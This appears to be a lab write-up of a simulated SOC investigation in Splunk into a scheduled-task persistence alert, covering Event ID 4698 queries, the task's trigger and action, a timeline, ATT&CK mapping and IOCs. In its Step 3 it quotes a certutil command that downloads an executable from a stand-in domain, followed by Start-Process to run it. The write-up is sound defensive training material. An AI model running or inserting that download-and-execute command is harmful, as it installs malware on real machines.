# -Splunk-Persistence-detection-lab

# 🔎 SOC Investigation Lab – Suspicious Scheduled Task Persistence (Splunk)

## 📌 Overview

This lab simulates a **Security Operations Center (SOC) investigation** where an alert was triggered for a **potential persistence mechanism using Windows Task Scheduler**.

As a **Level 1 SOC Analyst working at an MSSP**, the objective was to investigate the alert, analyze Windows logs in **Splunk SIEM**, and determine whether the activity represented a **true security incident or a false positive**.

The investigation focused on identifying:

- Creation of scheduled tasks
- The process responsible for creating the task
- Commands executed by the task
- Possible attacker persistence techniques

After analyzing the logs, the activity was confirmed to be a **True Positive**, indicating malicious persistence on the host.

---

# 🚨 Alert Information

| Field | Value |
|------|------|
| Alert Name | Potential Task Scheduler Persistence Identified |
| Time | 30/08/2025 – 10:06:07 |
| Host | WIN-H015 |
| User | oliver.thompson |
| Task Name | AssessmentTaskOne |
| Log Source | Windows Event Logs |
| SIEM | Splunk |
| Index | win-alert |

---

# 🧠 Initial Alert Assessment

Before querying the SIEM, it is important to analyze the **alert context**.

### Host Investigation

The host name is **WIN-H015**.

Organizations typically follow naming conventions:

| Prefix | Meaning |
|------|------|
| SRV | Server |
| WEB | Web Server |
| DB | Database |
| WIN / HOST | Workstation |

Because the host begins with **WIN**, it is likely a **user workstation rather than a server**.

---

### User Investigation

The user involved in the alert is:

**oliver.thompson**

Using the organization's **identity table**, we determine the role of this user.

Role: **System Engineer**

This information is important because some activities may be normal for certain roles. However, **creating suspicious scheduled tasks that download executables is not normal behavior even for IT staff.**

---

# 🔍 Step 1 – Identify the Scheduled Task Creation Event

Scheduled task creation in Windows generates **Event ID 4698**.

To investigate this event, we search the Splunk index containing Windows logs.

## Splunk Query

index="win-alert" EventCode=4698 AssessmentTaskOne
| table _time EventCode user_name host Task_Name Message


Explanation

This query:

Searches the win-alert index

Filters for EventCode 4698, which indicates scheduled task creation

Searches for the task name AssessmentTaskOne

Displays important fields including:

- Timestamp

- Event code

- User account

- Host name

- Task name

- Full event message

Findings

The results show:

- Only one event associated with this task

- The task was created on WIN-H015

- The activity was performed under the account oliver.thompson

- This confirms the alert corresponds to a single scheduled task creation event.

🖼 Investigation Screenshot

# 🔍 Step 2 – Analyze the Task Message Field

The Message field contains details about the scheduled task configuration.

Important sections include:

- Triggers

- Actions

- Principals

- Triggers Section

- The task is configured to:

- Run every day

- Execute at a specific time

- Run automatically on a user workstation

- This behavior is unusual because persistent daily execution is often used by attackers to maintain access.

🖼 Task Trigger Screenshot

# 🔍 Step 3 – Analyze the Exec Section

The Exec section reveals what command will run when the task executes.

The task performs the following actions:

- Uses certutil to download a file from a suspicious domain.

- Saves the file in the Temp directory.

- Renames the file to DataCollector.exe.

- Executes the file using PowerShell Start-Process.

Example command behavior:

certutil -urlcache -split -f http://tryhotme/DataCollector.exe
Start-Process DataCollector.exe
Why This Is Suspicious

The certutil utility is commonly abused by attackers to:

- Download malware

- Bypass security controls

- Avoid detection

- Saving files in the Temp directory is another common attacker tactic.

This strongly suggests malicious persistence.

🖼 Command Execution Screenshot

# 🔍 Step 4 – Identify the Process That Created the Task

Next, we identify the process responsible for creating the scheduled task.

- Findings
- Indicator	Value
- ProcessId	5816
- Parent Process	cmd.exe

This indicates the task was created through Command Prompt, which is often used by attackers for manual command execution.

# 🔍 Step 5 – Discovery Activity

Further log analysis revealed that the attacker performed system discovery.

Findings

- The attacker enumerated the local group:

 Administrators

- This indicates the attacker was checking for privileged accounts on the system.

# 🔍 Step 6 – Lateral Movement Investigation

Logs also showed the attacker logged in from another workstation.

- Source Host

- DEV-QA-SERVER

- This suggests the attacker may have:

- Compromised another machine first

- Moved laterally through the network

# 📊 Attack Timeline

| Time | Event |
|-----|------|
| 10:06 | Suspicious scheduled task created |
| 10:06 | Task configured to run daily |
| 10:06 | certutil command configured to download malware |
| 10:06 | PowerShell configured to execute downloaded file |
| 10:07 | Discovery activity detected |
| 10:08 | Lateral movement from DEV-QA-SERVER identified |

---

# 🧠 MITRE ATT&CK Mapping

| Technique | ID | Description |
|----------|----|-------------|
| Scheduled Task | T1053 | Persistence using Windows Task Scheduler |
| Command Shell | T1059.003 | Execution using Command Prompt |
| System Information Discovery | T1082 | Attacker gathering system information |
| Account Discovery | T1087 | Enumeration of accounts |
| Ingress Tool Transfer | T1105 | Downloading malicious payload |

---

# 🧰 Tools Used

| Tool | Purpose |
|------|--------|
| Splunk SIEM | Log analysis and investigation |
| Windows Event Logs | Source of security events |
| Task Scheduler Logs | Scheduled task activity |
| Threat Intelligence Platforms | Domain reputation analysis |
| GitHub | Documentation and report publishing |

---

# 🚩 Indicators of Compromise (IOCs)

| Type | Value |
|------|------|
| Host | WIN-H015 |
| User | oliver.thompson |
| Task Name | AssessmentTaskOne |
| Malicious File | DataCollector.exe |
| Domain | tryhotme |
| Source Host | DEV-QA-SERVER |

# 🔎 Next Investigation Steps

This case should be escalated to a Level 2 SOC Analyst for deeper investigation.

Questions that require further analysis:

- How was the scheduled task initially created?

- How did the attacker gain access to the WIN-H015 workstation?

- Was the oliver.thompson account compromised?

- Is the DEV-QA-SERVER host also compromised?

- Was malware successfully executed on the system?

# 🧾 Final Conclusion

Based on the investigation findings:

- A scheduled task was created using Event ID 4698

- The task downloads a malicious executable using certutil

- The file is executed using PowerShell

- The activity demonstrates persistence behavior

- The attacker performed privilege and account discovery

- Evidence suggests lateral movement from another workstation

- This confirms the alert represents a True Positive security incident involving malicious persistence through Windows Task Scheduler.

The incident should be escalated to the SOC L2 team for containment and remediation.
